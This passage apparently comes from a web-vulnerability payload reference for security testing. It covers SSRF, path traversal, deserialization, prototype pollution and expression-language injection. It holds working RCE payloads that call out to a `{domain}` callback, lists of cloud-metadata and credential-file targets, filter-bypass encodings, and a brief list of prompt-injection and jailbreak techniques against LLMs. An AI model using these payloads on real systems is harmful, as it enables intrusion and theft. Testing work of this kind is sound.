- `php://` (filter, input, data wrappers)
- `jar://` (Java)
- `netdoc://` (Java)

**Cloud Metadata Endpoints:**
- **AWS:** `http://169.254.169.254/latest/meta-data/`, `http://169.254.170.2/v2/credentials/`
- **GCP:** `http://metadata.google.internal/computeMetadata/v1/`
- **Azure:** `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
- **DigitalOcean:** `http://169.254.169.254/metadata/v1/`
- **Alibaba:** `http://100.100.100.200/latest/meta-data/`
- **Oracle Cloud:** `http://169.254.169.254/opc/v2/`
- **Kubernetes:** `https://kubernetes.default.svc/`, environment variables

**Bypass Techniques:**
- IP address formats: decimal (`2130706433`), hex (`0x7f000001`), octal (`0177.0.0.1`), IPv6 (`[::1]`, `[0:0:0:0:0:ffff:127.0.0.1]`)
- DNS rebinding
- URL parsing differentials (`http://127.0.0.1@evil.com`, `http://evil.com#@127.0.0.1`)
- Redirect-based SSRF (open redirect chaining)
- `//` vs `\\` (UNC path for Windows)
- Null byte truncation
- URL encoding / double encoding
- Domain confusion (`127.0.0.1.nip.io`, `localtest.me`)
- `0.0.0.0`, `[::]`, `0177.0.0.1`

---

### 8. Path Traversal / Local File Inclusion (LFI)

**Traversal Sequences:**
- `../`, `..\\` (forward and back slash)
- `....//` (double-dot bypass for basic filters that strip `../`)
- `%2e%2e%2f`, `%2e%2e/`, `..%2f` (URL encoding)
- `%252e%252e%252f` (double URL encoding)
- `..%c0%af`, `..%ef%bc%8f` (UTF-8 overlong encoding)
- `%00` null byte truncation (PHP < 5.3.4)
- `/*` suffix (glob/wildcard)
- `/;/` (Tomcat/Jetty path parameter normalization)
- `/.;/` (Spring/reverse proxy normalization)
- `\..\..\` (Windows backslash)

**Target Files:**
- Linux: `/etc/passwd`, `/etc/shadow`, `/etc/hosts`, `/etc/hostname`, `/proc/self/environ`, `/proc/N/environ`, `/proc/self/cmdline`, `/proc/self/cwd`, `/proc/self/fd/N`
- Windows: `C:\windows\system32\drivers\etc\hosts`, `C:\boot.ini`, `C:\windows\win.ini`, `C:\inetpub\wwwroot\web.config`
- Application: `.env`, `config.php`, `web.config`, `application.properties`, `settings.py`, `.git/config`

**LFI to RCE:**
- Log poisoning (`/var/log/apache2/access.log`, `/var/log/auth.log`)
- PHP wrappers (`php://filter/convert.base64-encode`, `php://input`, `data://`, `expect://`)
- `/proc/self/environ` poisoning via User-Agent
- Session file inclusion (`/tmp/sess_*`)
- Temp file race conditions

---

### 9. HTTP Request Smuggling

**Sub-Types:**
- CL.TE (front-end uses Content-Length, back-end uses Transfer-Encoding)
- TE.CL (front-end uses Transfer-Encoding, back-end uses Content-Length)
- TE.TE (Transfer-Encoding obfuscation - both use TE but parse differently)
- HTTP/2 downgrade smuggling (H2.CL, H2.TE)
- HTTP/2 request splitting (CRLF injection in pseudo-headers)

**Detection Payloads:**
- Time-based differential (smuggled request causes timeout)
- Reflected smuggling (content from smuggled request appears in next response)
- OOB (smuggled request triggers callback)
- Content-Length / Transfer-Encoding header manipulation
- Chunked encoding edge cases (`0\r\n\r\n`, chunk extension parsing)

**Obfuscation:**
- `Transfer-Encoding: chunked` with variations: `Transfer-Encoding : chunked`, `Transfer-Encoding: xchunked`, `Transfer-Encoding: chunked\r\nTransfer-Encoding: x`, tab/space variations, capitalization, line folding

---

### 10. Cross-Site Request Forgery (CSRF)

**Sub-Types:**
- GET-based CSRF (action via URL/img src)
- POST-based CSRF (auto-submitting form)
- JSON-based CSRF (content-type manipulation)
- Flash-based CSRF (crossdomain.xml abuse)
- Login CSRF (force victim into attacker's session)

**Token Bypass Techniques:**
- Token removal (omit parameter entirely)
- Token reuse (use any valid token)
- Token from another user
- Predictable token patterns
- Referer header manipulation / removal
- SameSite cookie bypass via subdomain or redirect
- Method override (`_method=POST` in GET request, `X-HTTP-Method-Override`)
- Content-type manipulation to avoid preflight CORS check

---

### 11. Clickjacking

**Payload Types:**
- iframe overlay with opacity manipulation
- Drag-and-drop clickjacking
- Cursorjacking (custom cursor offset)
- Likejacking (social media actions)
- Multi-step clickjacking sequences
- X-Frame-Options / CSP `frame-ancestors` bypass testing

---

### 12. DOM-Based Vulnerabilities

**Vulnerable Sinks:**
- `document.write()`, `document.writeln()`
- `element.innerHTML`, `element.outerHTML`
- `eval()`, `setTimeout()`, `setInterval()`, `new Function()`
- `location.href`, `location.assign()`, `location.replace()`
- `window.open()`
- `element.src`, `element.href`, `element.action`
- `$.html()`, `$.append()`, `$.after()` (jQuery DOM manipulation)
- `postMessage()` handler exploitation
- `document.cookie` manipulation
- `localStorage` / `sessionStorage` injection
- `JSON.parse()` with unsanitized input
- URL fragment (`location.hash`) and search (`location.search`) as sources

**Sub-Types:**
- DOM XSS
- DOM-based open redirect
- DOM-based cookie manipulation
- DOM-based JavaScript injection
- DOM clobbering
- Client-side prototype pollution leading to DOM XSS

---

### 13. Cross-Origin Resource Sharing (CORS) Misconfiguration

**Test Payloads:**
- `Origin: null` (sandboxed iframe)
- `Origin: https://evil.com` (arbitrary origin reflection)
- `Origin: https://target.com.evil.com` (subdomain/suffix matching)
- `Origin: https://eviltarget.com` (prefix matching)
- `Origin: https://target.com_.evil.com` (regex bypass)
- Null origin via `data:` URI or sandboxed iframe
- Credential leak via `Access-Control-Allow-Credentials: true` with reflected origin
- Wildcard `*` with credentials

---

### 14. WebSocket Vulnerabilities

**Sub-Types:**
- Cross-site WebSocket hijacking (CSWSH) - missing origin validation
- WebSocket message injection / manipulation
- WebSocket-based XSS (if messages rendered in DOM)
- WebSocket-based SQLi (if messages hit DB queries)
- Denial of service (large message flooding)
- Insecure `ws://` (no TLS)
- Missing authentication on WebSocket upgrade

---

### 15. Web Cache Poisoning

**Sub-Types:**
- Unkeyed header poisoning (`X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`, `X-Rewrite-URL`)
- Unkeyed cookie poisoning
- Fat GET request poisoning (body in GET request)
- Parameter cloaking (`?param=value;injected=value`)
- Unkeyed port in Host header
- Multiple Host headers
- Line folding / header wrapping
- Pragma / caching directive manipulation

**Detection:**
- Cache buster parameter + reflected unkeyed input
- OOB callback in unkeyed header
- Response differential based on cache hit/miss

---

### 16. Web Cache Deception

**Sub-Types:**
- Path confusion (`/account/settings/nonexistent.css`, `/account/settings/..%2fstatic.js`)
- Extension-based deception (`.css`, `.js`, `.jpg`, `.ico`, `.woff` appended to dynamic URLs)
- Delimiter-based (`;`, `?`, `#` path confusion between origin and CDN)
- Encoding-based path confusion

---

### 17. Insecure Deserialization

**Per-Language Four Pillars:**

#### Java Deserialization
**Sinks:** `ObjectInputStream.readObject()`, `ObjectInputStream.readUnshared()`, `XMLDecoder.readObject()`, `XStream.fromXML()`, `Jackson ObjectMapper` (with polymorphic typing / `enableDefaultTyping()`), `Kryo.readObject()`, `Hessian.readObject()`, `JMX MLet`, `JNDI lookup`, `T3/IIOP` (WebLogic)

| Pillar | Payload Syntax |
|---|---|
| **Error** | Gadget probe - send serialized object with specific class; `ClassNotFoundException` or `InvalidClassException` confirms class existence/absence |
| **Math** | Gadget chain that writes `1337` to response (e.g., via `TemplatesImpl` + reflection to set output) - rare, mostly use error or OOB |
| **Timing** | `Thread.sleep(5000)` via `InvokerTransformer` chain, `Runtime.exec("sleep 5")` via CommonsCollections gadget |
| **OOB** | `Runtime.exec("nslookup {domain}")`, `URL("http://{domain}").openStream()`, JNDI callback (`ldap://{domain}/...`, `rmi://{domain}/...`), DNS via `InetAddress.getByName("{domain}")` |

**Gadget Libraries (ysoserial + beyond):**
- Commons Collections 1-7 (CC1-CC7)
- Commons Beanutils
- Spring (Spring1, Spring2)
- Hibernate1
- JDK7u21
- Jython1
- BeanShell1
- Groovy1
- ROME
- Click1
- Vaadin1
- Wicket1
- C3P0 (JNDI reference)
- JRMPClient / JRMPListener
- URLDNS (DNS-only, no dependency)

**Java-Specific Params:**
- Magic bytes: `AC ED 00 05` (Java serialized), `rO0AB` (base64)
- JNDI URLs: `ldap://`, `rmi://`, `iiop://`, `dns://`, `corba://`
- Jackson polymorphic: `["class.name", {params}]`, `@type` field
- XStream: `<class.name>` XML tags mapping to Java classes

#### PHP Deserialization
**Sinks:** `unserialize()`, `phar://` stream wrapper (triggers deserialization on file operations like `file_exists()`, `fopen()`, `file_get_contents()`, `is_dir()`)

| Pillar | Payload Syntax |
|---|---|
| **Error** | `unserialize("invalid")` (warning), class existence probing via `__wakeup()` / `__destruct()` errors |
| **Math** | POP chain that echoes `1337` via `__toString()` magic method |
| **Timing** | POP chain calling `sleep(5)`, `system("sleep 5")`, or `usleep(5000000)` |
| **OOB** | POP chain calling `file_get_contents("http://{domain}")`, `system("nslookup {domain}")`, `curl_exec()` to `{domain}` |

**PHP Magic Methods (POP chain triggers):**
- `__construct()`, `__destruct()`, `__wakeup()`, `__sleep()`
- `__toString()`, `__invoke()`, `__call()`, `__callStatic()`
- `__get()`, `__set()`, `__isset()`, `__unset()`
- `__serialize()` / `__unserialize()` (PHP 7.4+)

**PHP-Specific Params:**
- Serialized format: `O:4:"User":1:{s:4:"name";s:5:"admin";}`, `a:1:{i:0;s:4:"test";}` 
- Phar: `phar://uploads/avatar.jpg/test` (triggers deser on any file op)
- Type juggling in deserialization: `i:0;` vs `s:1:"0";` vs `b:0;`

#### .NET Deserialization
**Sinks:** `BinaryFormatter.Deserialize()`, `SoapFormatter.Deserialize()`, `NetDataContractSerializer`, `LosFormatter`, `ObjectStateFormatter`, `Json.NET` (with `TypeNameHandling != None`), `JavaScriptSerializer` (with `SimpleTypeResolver`), `XmlSerializer` (with known types), `DataContractSerializer`, `ViewState` (when MAC validation disabled)

| Pillar | Payload Syntax |
|---|---|
| **Error** | `SerializationException`, `TypeLoadException` for missing types, `InvalidCastException` |
| **Math** | Gadget chain that computes and reflects `1337` - rare, mostly error/OOB |
| **Timing** | `Thread.Sleep(5000)` via `TypeConfuseDelegate`, `Process.Start("timeout","5")` |
| **OOB** | `Process.Start("nslookup","{domain}")`, `WebClient.DownloadString("http://{domain}")`, `Dns.GetHostEntry("{domain}")` |

**ysoserial.net Gadgets:**
- `TypeConfuseDelegate`
- `PSObject` (PowerShell)
- `TextFormattingRunProperties`
- `WindowsIdentity`
- `ActivitySurrogateSelector`
- `ObjectDataProvider`
- `DataSet` / `DataTable`

**.NET-Specific Params:**
- BinaryFormatter magic: `00 01 00 00 00 FF FF FF FF`
- ViewState: `__VIEWSTATE` parameter, `__VIEWSTATEGENERATOR`
- Json.NET: `"$type": "System.Namespace.Class, Assembly"` 

#### Python Deserialization
**Sinks:** `pickle.loads()`, `pickle.load()`, `cPickle.loads()`, `yaml.load()` (without `Loader=SafeLoader`), `yaml.unsafe_load()`, `shelve.open()`, `marshal.loads()`, `jsonpickle.decode()`, `dill.loads()`

| Pillar | Payload Syntax |
|---|---|
| **Error** | Malformed pickle opcodes → `UnpicklingError`, reference to non-existent module |
| **Math** | Pickle `__reduce__` returning `(eval, ("7*191",))` - reflected if output consumed |
| **Timing** | `__reduce__` → `(os.system, ("sleep 5",))`, `(time.sleep, (5,))` |
| **OOB** | `__reduce__` → `(os.system, ("nslookup {domain}",))`, `(urllib.request.urlopen, ("http://{domain}",))`, `(subprocess.check_output, (["curl","http://{domain}"],))` |

**Python-Specific Params:**
- Pickle magic: `\x80\x04\x95` (protocol 4), `\x80\x03` (protocol 3), `\x80\x02` (protocol 2)
- YAML dangerous tags: `!!python/object/apply:os.system ["cmd"]`, `!!python/object/new:subprocess.check_output [["cmd"]]`
- `__reduce__()`, `__reduce_ex__()`, `__getstate__()`, `__setstate__()` - magic methods for pickle

#### Ruby Deserialization
**Sinks:** `Marshal.load()`, `Marshal.restore()`, `YAML.load()` (Psych), `JSON.parse()` (with `create_additions: true`), `Oj.load()` (with `mode: :object`)

| Pillar | Payload Syntax |
|---|---|
| **Error** | `Marshal.load("invalid")` → `TypeError`, missing class → `ArgumentError` |
| **Math** | Gadget chain evaluating `7*191` via `ERB` / `eval` - reflected if consumed |
| **Timing** | Gadget chain calling `sleep(5)`, `` `sleep 5` `` via `Kernel.system` |
| **OOB** | Gadget chain calling `` `nslookup {domain}` ``, `Net::HTTP.get(URI("http://{domain}"))` |

**Ruby-Specific Params:**
- Marshal magic: `\x04\x08` header
- YAML: `!ruby/object:Gem::Installer`, `!ruby/object:Gem::SpecFetcher`, `!ruby/object:Gem::Requirement`
- Universal Deserialisation Gadget (ERB + `instance_eval`)

#### Node.js Deserialization
**Sinks:** `node-serialize.unserialize()`, `js-yaml.load()` (without `safeLoad`), `funcster`, `cryo.parse()`, `serialize-javascript` (with eval)

| Pillar | Payload Syntax |
|---|---|
| **Error** | Malformed serialized object → `SyntaxError`, reference error |
| **Math** | `{"rce":"_$$ND_FUNC$$_function(){return 7*191}()"}` - if output reflected |
| **Timing** | `{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('sleep 5')}()"}` |
| **OOB** | `{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('nslookup {domain}')}()"}`, YAML: `!!js/function "function(){...}"` |

**Node-Specific Params:**
- node-serialize marker: `_$$ND_FUNC$$_`
- IIFE pattern: `_$$ND_FUNC$$_function(){...}()` (Immediately Invoked)
- js-yaml unsafe tags: `!!js/function`, `!!js/regexp`, `!!js/undefined`

---

### 18. Server-Side Include (SSI) Injection

**Directives:**
- `<!--#exec cmd="..." -->` - command execution
- `<!--#echo var="..." -->` - variable display
- `<!--#include file="..." -->` - file inclusion
- `<!--#config errmsg="..." -->` - error message manipulation
- `<!--#fsize file="..." -->` - file size disclosure
- `<!--#flastmod virtual="..." -->` - last modified date
- `<!--#printenv -->` - environment dump
- `<!--#set var="..." value="..." -->` - variable setting

---

### 19. Edge Side Include (ESI) Injection

**Payloads:**
- `<esi:include src="http://{domain}/" />` - remote inclusion / SSRF
- `<esi:include src="/internal/path" />` - internal resource access
- `<esi:assign>` with `<esi:vars>` - variable manipulation for XSS
- `<esi:inline>` - cache manipulation
- `<esi:debug />` - debug information disclosure

**Targets:** Varnish, Squid, Akamai, Fastly, F5, Cloudflare (where ESI is enabled)

---

### 20. XSLT Injection

**Payloads:**
- `<xsl:value-of select="system-property('xsl:version')" />` - version detection
- `<xsl:value-of select="document('http://{domain}')" />` - OOB / SSRF
- `<xsl:value-of select="document('/etc/passwd')" />` - file read
- XSLT 1.0 vs 2.0 vs 3.0 specific functions
- Saxon-specific extension functions (Java class loading)

---

### 21. LDAP Injection

**Sub-Payload Types:**
- Boolean-based (`*`, `)(cn=*))(|(cn=*`, `*)(uid=*))(|(uid=*`)
- OR/AND injection (`)(|(password=*))`)
- Wildcard extraction (`a*`, `b*`, `c*` - character-by-character)
- Null byte truncation (`%00`)
- Blind LDAP (response differential)

---

### 22. Header Injection / CRLF Injection

**Sub-Payload Types:**
- HTTP response splitting (`%0d%0a` injected into headers)
- Session fixation via `Set-Cookie` injection
- Cache poisoning via injected headers
- XSS via injected `Content-Type` or response body
- Open redirect via `Location` header injection
- `X-Forwarded-For` / `X-Forwarded-Host` injection

---

### 23. HTTP Host Header Attacks

**Sub-Types:**
- Password reset poisoning (Host header in reset link)
- Web cache poisoning via Host
- SSRF via Host header routing
- Authentication bypass via Host
- Virtual host brute-forcing

**Payloads:**
- `Host: evil.com`
- `Host: target.com\r\nHost: evil.com` (duplicate)
- `Host: target.com:evil.com@target.com`
- `X-Forwarded-Host: evil.com`
- `X-Host: evil.com`
- `Forwarded: host=evil.com`
- Absolute URL in request line with different Host header

---

### 24. OAuth Vulnerabilities

**Sub-Types:**
- Authorization code theft via `redirect_uri` manipulation
- Open redirect in `redirect_uri`
- CSRF in OAuth flow (missing `state` parameter)
- Token leakage via Referer header
- Scope escalation
- PKCE downgrade attacks
- Mix-up attacks (IdP confusion)
- Race conditions in token exchange

---

### 25. JWT Vulnerabilities

**Sub-Types:**
- `alg: none` signature bypass
- Algorithm confusion (RS256 → HS256, using public key as HMAC secret)
- Weak secret brute-force (`HS256` with common passwords)
- `kid` parameter injection (path traversal, SQLi, command injection in key lookup)
- `jku` / `x5u` header injection (SSRF to attacker-controlled JWKS)
- `jwk` header injection (embed attacker's key)
- Expired token acceptance
- Claim manipulation (`sub`, `role`, `admin`, `iss`)
- Nested JWT attacks

---

### 26. File Upload Vulnerabilities

**Sub-Types:**
- Web shell upload (`.php`, `.jsp`, `.asp`, `.aspx`, `.py`, `.pl`, `.cgi`)
- Extension bypass (`.php5`, `.pHp`, `.php.jpg`, `.php%00.jpg`, `.php;.jpg`)
- Content-Type bypass (`image/jpeg` with PHP content)
- Magic bytes injection (GIF89a + PHP, PNG header + PHP)
- SVG with embedded XSS/XXE
- `.htaccess` upload (custom handler mapping)
- Polyglot files (valid image AND valid PHP/JSP)
- ZIP symlink attacks
- Path traversal in filename (`../../../etc/cron.d/shell`)
- Overwriting critical files (`.ssh/authorized_keys`, `.bashrc`)
- ImageTragick (CVE-2016-3714 and related)
- EICAR test file / archive bombs / zip bombs
- Office document macros

---

### 27. Prototype Pollution

**Sub-Types:**
- **Client-side:** `__proto__`, `constructor.prototype` via URL parameters, JSON input, `Object.assign`, deep merge
- **Server-side:** prototype pollution in Node.js leading to RCE, auth bypass, or DoS

**Pollution Vectors (how to set the property):**

| Vector | Syntax |
|---|---|
| Query string | `?__proto__[polluted]=1`, `?__proto__.polluted=1` |
| JSON body | `{"__proto__":{"polluted":"1"}}` |
| Constructor path | `{"constructor":{"prototype":{"polluted":"1"}}}` |
| Query constructor | `?constructor[prototype][polluted]=1` |
| Nested object | `?a[__proto__][polluted]=1`, `{"a":{"__proto__":{"polluted":"1"}}}` |
| Array bracket | `?__proto__[0]=1` (array index as property) |
| Dot notation | `__proto__.polluted=1` in form body |

**Four Pillars:**

| Pillar | Payload Syntax |
|---|---|
| **Error** | `{"__proto__":{"toString":1}}` → `TypeError: toString is not a function` when any object is coerced to string. `{"__proto__":{"hasOwnProperty":1}}` → breaks `obj.hasOwnProperty()` checks |
| **Math** | `{"__proto__":{"polluted":"1337"}}` → check if `({}).polluted === "1337"` appears in response or affects template output |
| **Timing** | Pollute `shell`/`env` to trigger slow command: `{"__proto__":{"shell":"/bin/bash","env":{"LD_PRELOAD":"/dev/null"}}}` → slow spawn. Or pollute `timeout` property to large value |
| **OOB** | Pollute `shell` + trigger `child_process.spawn`: `{"__proto__":{"shell":"bash","execArgv":["--eval=require('child_process').execSync('nslookup {domain}')"]}}`. Or `NODE_OPTIONS` pollution: `{"__proto__":{"NODE_OPTIONS":"--require=/proc/self/environ"}}` |

**Specific Properties to Pollute & Their Effects:**

#### child_process / Process Execution Gadgets
| Property | Effect |
|---|---|
| `shell` | Sets shell for `child_process.spawn()` / `child_process.exec()` - RCE |
| `env` | Injects environment variables into spawned processes |
| `NODE_OPTIONS` | Injected into `process.env.NODE_OPTIONS` - `--require`, `--eval`, `--inspect` |
| `execPath` | Controls path to Node binary for `child_process.fork()` |
| `execArgv` | Injects arguments to forked Node processes - `--eval`, `--require` |
| `argv0` | Controls `process.argv[0]` in forked processes |
| `cwd` | Changes working directory for spawned processes |
| `stdio` | Manipulate stdin/stdout/stderr of child processes |
| `uid` / `gid` | Change user/group of spawned process (privilege escalation) |

#### Template Engine Gadgets
| Engine | Property | Effect |
|---|---|---|
| **EJS** | `outputFunctionName` | Injected into compiled template function - RCE: `"x]});process.mainModule.require('child_process').execSync('nslookup {domain}');//"` |
| **EJS** | `escapeFunction` | Controls escape function name - same RCE pattern |
| **EJS** | `client` | Enables client mode, changes compilation behavior |
| **EJS** | `destructuredLocals` | Array injection into template locals |
| **Pug** | `block` | Injected into compiled template |
| **Pug** | `compileDebug` | Enables debug mode, changes code paths |
| **Pug** | `self` | Changes variable scoping in template |
| **Pug** | `line` | Manipulates source line tracking |
| **Handlebars** | `main` | / `program` - override template compilation |
| **Handlebars** | `__proto__.type` | Set to `Program` to inject AST nodes |
| **Nunjucks** | `type` | AST node type injection |
| **Mustache** | `tags` | Override delimiter tags |
| **Dot.js** | `varname` | Variable name injection - RCE in compiled templates |

#### Express / Web Framework Gadgets
| Property | Effect |
|---|---|
| `outputEncoding` | Controls response encoding |
| `content-type` | Override response Content-Type header |
| `status` | Manipulate HTTP response status code |
| `body` | Inject response body |
| `headers` | Inject HTTP response headers |
| `statusCode` | Override status code in response object |
| `isAdmin` / `role` / `admin` | Auth bypass if checked via `obj.isAdmin` without `hasOwnProperty` |
| `constructor` | Break constructor checks / instanceof |
| `length` | Break array/string length checks - DoS or logic bypass |

#### Detection & Fingerprinting Properties
| Property | Purpose |
|---|---|
| `polluted` | Generic canary - check if `({}).polluted` exists in response |
| `__polluted__` | Alternative canary with dunder syntax |
| `toString` | Breaks string coercion → `TypeError` if set to non-function |
| `valueOf` | Breaks numeric coercion |
| `hasOwnProperty` | Breaks property existence checks |
| `toJSON` | Breaks `JSON.stringify()` |
| `then` | Makes any object a "thenable" - breaks async/await |
| `constructor` | Breaks `constructor` checks, `instanceof` |
| `__defineGetter__` | Deprecated but still triggers in some engines |
| `__defineSetter__` | Deprecated but still triggers in some engines |

#### Server-Side RCE Chains (End-to-End)

**EJS + child_process:**
```
{"__proto__":{"outputFunctionName":"x]});process.mainModule.require('child_process').execSync('nslookup {domain}');//"}}
```

**Pug + child_process:**
```
{"__proto__":{"block":{"type":"Text","val":"x]});process.mainModule.require('child_process').execSync('nslookup {domain}');//"}}}
```

**child_process.spawn shell override:**
```
{"__proto__":{"shell":"/proc/self/exe","execArgv":["--eval=require('child_process').execSync('nslookup {domain}')"]}}
```

**child_process.fork env injection:**
```
{"__proto__":{"env":{"NODE_OPTIONS":"--require /proc/self/cmdline","EVIL":"';nslookup {domain};'"}}}
```

---

### 28. GraphQL Vulnerabilities

**Sub-Types:**
- Introspection query (`__schema`, `__type`)
- Field suggestion exploitation (error messages reveal field names)
- Batching attacks (multiple operations in one request)
- Alias-based rate limit bypass
- Nested query DoS (depth/complexity abuse)
- SQL/NoSQL injection through GraphQL arguments
- IDOR via direct object reference in queries
- Mutation abuse (unauthorized state changes)
- Directive injection
- Subscription abuse (WebSocket-based)

**Detection Payloads:**
- `{__schema{types{name,fields{name}}}}`
- `{__type(name:"Query"){fields{name}}}`
- Injection in variables: `{"id": "1 OR 1=1"}`, `{"id": {"$ne": null}}`

---

### 29. Race Conditions

**Sub-Types:**
- Time-of-check to time-of-use (TOCTOU)
- Limit overrun (balance, coupon, vote, rate limit bypass)
- Single-endpoint races (same request concurrent)
- Multi-endpoint races (sequential operations made concurrent)
- Session-based race conditions
- File operation races (temp files, uploads)

**Detection:**
- HTTP/2 single-packet attack (concurrent requests in one TCP frame)
- Last-byte sync technique
- Turbo Intruder / race-the-web techniques

---

### 30. API-Specific Vulnerabilities

**Sub-Types:**
- Mass assignment / auto-binding (`role=admin`, `isAdmin=true` in body)
- BOLA/IDOR (manipulating object IDs in REST paths)
- BFLA (calling endpoints above privilege level)
- Excessive data exposure (API returns more fields than UI shows)
- Rate limiting bypass (header manipulation, endpoint variation)
- API versioning abuse (`/v1/` vs `/v2/` with different auth)
- HTTP method override (`X-HTTP-Method-Override: DELETE`)
- Content-type juggling (`application/json` vs `application/xml` vs `application/x-www-form-urlencoded`)
- Parameter pollution (HPP - `?id=1&id=2`)

---

### 31. Web LLM / AI Attacks

**Sub-Types:**
- Prompt injection (direct and indirect)
- Prompt leaking (extract system prompt)
- Tool/function abuse (LLM-driven function calls with attacker-controlled params)
- Training data extraction
- Jailbreaking (DAN-style, role-play, encoding tricks)
- Indirect prompt injection via retrieved content (RAG poisoning)
- Markup injection in LLM output (XSS if rendered as HTML)

---

### 32. Memory Corruption / Format String Bugs

**Sub-Types:**
- Buffer overflow (stack, heap, integer overflow/underflow)
- Format string injection (`%x`, `%s`, `%n`, `%p`, `%d`, `%%`, `%*.*s`, `%@`)
- Use-after-free
- Double free
- Off-by-one
- Heap spraying indicators

**Format String Payloads:**
- `%s%s%s%s%s` - crash via stack read
- `%x%x%x%x` - stack memory leak
- `%n` - arbitrary write (if format string is writable)
- `%p%p%p%p` - pointer leak
- `%*.*s` - controlled width read
- `%@` - Objective-C object format
- `{0}` - .NET string format injection
- `<<< %s(un='%s') = %u` - mixed format
- `AAAA%08x.%08x.%08x.%08x` - stack walking

**Overflow Detection:**
- Long string payloads (`A` * 1000, `A` * 5000, `A` * 10000)
- Integer boundaries (`2147483647`, `2147483648`, `-2147483648`, `4294967295`, `4294967296`)
- Null byte injection at various positions

---

### 33. Information Disclosure

**Sub-Payload Types:**
- Error triggering (malformed input to expose stack traces, versions, paths)
- Debug endpoint discovery (`/debug`, `/trace`, `/actuator`, `/console`, `/phpinfo.php`)
- Source code disclosure (`.bak`, `.old`, `.swp`, `~`, `.git/`, `.svn/`, `.DS_Store`)
- Environment variable leakage (via SSTI, command injection, LFI, SSRF)
- Cloud credential leakage (AWS keys, GCP tokens, Azure secrets via metadata or env vars)
- Version fingerprinting headers (`Server`, `X-Powered-By`, `X-AspNet-Version`)
- Verbose error strings (see `Errors.txt`)
- Differential response analysis (timing, size, status code differences)

---

### 34. Access Control / Authorization Bypass

**Sub-Types:**
- Horizontal privilege escalation (access other users' data by ID manipulation)
- Vertical privilege escalation (access admin functions as regular user)
- IDOR (Insecure Direct Object Reference - predictable IDs, UUIDs, sequential)
- Path-based access control bypass (`/admin/../admin`, `/ADMIN`, `/Admin`, URL encoding)
- Method-based bypass (`GET` vs `POST` vs `PUT` vs `PATCH` vs `DELETE`)
- Header-based bypass (`X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-For: 127.0.0.1`)
- Referer-based bypass
- IP-based bypass (spoofing internal IPs)
- Multi-step process skipping (jumping to step 3 without step 1)

---

### 35. Authentication Bypass

**Sub-Types:**
- Default/weak credentials
- Credential stuffing / brute force
- Password reset flow manipulation (token prediction, host header poisoning, response manipulation)
- 2FA bypass (response manipulation, race condition, backup codes, direct navigation)
- Remember-me token exploitation
- Session fixation
- Account lockout bypass
- Username enumeration (timing, error message, response size differential)

---

### 36. Business Logic Vulnerabilities

**Sub-Types:**
- Price manipulation (negative quantities, zero prices, currency rounding)
- Workflow bypass (skipping required steps)
- Race condition exploitation in transactions
- Coupon/discount abuse (reuse, negative values, stacking)
- Referral system abuse
- Trust boundary violations (client-side validation only)
- Insufficient input validation on business rules (age, date ranges, limits)

---

### 37. Regular Expression Denial of Service (ReDoS)

**Detection Payloads:**
- `(\w*)+$` - catastrophic backtracking
- `([a-zA-Z]+)*$` - exponential matching
- `((a+)+)+$` - nested quantifiers
- Long strings matching partial patterns to trigger backtracking

---

### 38. Expression Language (EL) Injection

Distinct from SSTI - EL injection targets expression evaluation engines embedded in frameworks, not template rendering engines.

#### Java Unified EL (JSP/JSF)
**Delimiters:** `${expr}`, `#{expr}` (deferred)

| Pillar | Payload Syntax |
|---|---|
| **Error** | `${invalid.class}` (PropertyNotFoundException), `${1/0}` |
| **Math** | `${7*191}` → `1337`, `#{7*191}` → `1337` |
| **Timing** | `${Runtime.getRuntime().exec("sleep 5")}`, `${"".getClass().forName("java.lang.Thread").getMethod("sleep",Long.TYPE).invoke(null,5000)}` |
| **OOB** | `${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"nslookup {domain}")}` |

#### Spring SpEL
**Delimiters:** `${expr}`, `#{expr}`, `T(class)` prefix

| Pillar | Payload Syntax |
|---|---|
| **Error** | `T(invalid.Class)` (ClassNotFoundException), `#{1/0}` |
| **Math** | `T(java.lang.Math).abs(-1337)` → `1337`, `#{7*191}` |
| **Timing** | `T(java.lang.Thread).sleep(5000)`, `T(java.lang.Runtime).getRuntime().exec("sleep 5")` |
| **OOB** | `T(java.lang.Runtime).getRuntime().exec("nslookup {domain}")`, `new java.net.URL("http://{domain}").openStream()`, `T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("curl http://{domain}").getInputStream())` |

**SpEL-Specific Methods:**
- `T(class)` - type reference for static methods
- `new ClassName()` - constructor invocation
- `#root`, `#this` - context variables
- `.?[selector]` - collection projection/selection

#### OGNL (Apache Struts)
**Delimiters:** `%{expr}`, `${expr}`, `#expr`

| Pillar | Payload Syntax |
|---|---|
| **Error** | `%{#invalid}` (NoSuchPropertyException) |
| **Math** | `%{7*191}` → `1337` |
| **Timing** | `%{@java.lang.Thread@sleep(5000)}`, `%{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec("sleep 5"))}` |
| **OOB** | `%{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec("nslookup {domain}"))}`, `%{new java.net.URL("http://{domain}").openStream()}` |

**OGNL-Specific:**
- `@class@method` - static method invocation
- `#context`, `#_memberAccess` - Struts context manipulation
- `(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)` - sandbox bypass
- `#attr`, `#application`, `#session`, `#request`, `#parameters` - Struts objects

#### MVEL
**Delimiters:** `@{expr}`, `${expr}`

| Pillar | Payload Syntax |
|---|---|
| **Error** | `@{invalid()}` (CompileException) |
| **Math** | `@{7*191}` → `1337` |
| **Timing** | `@{Runtime.getRuntime().exec("sleep 5")}`, `@{Thread.sleep(5000)}` |
| **OOB** | `@{Runtime.getRuntime().exec("nslookup {domain}")}`, `@{new java.net.URL("http://{domain}").openStream()}` |

#### JBoss EL
**Delimiters:** `${expr}`, `#{expr}` (same as Unified EL but with JBoss extensions)

| Pillar | Payload Syntax |
|---|---|
| **Error** | Same as Unified EL |
| **Math** | `#{7*191}` → `1337` |
| **Timing** | `#{request.getClass().forName("java.lang.Thread").getMethod("sleep",request.getClass().forName("java.lang.Long").TYPE).invoke(null,5000)}` |
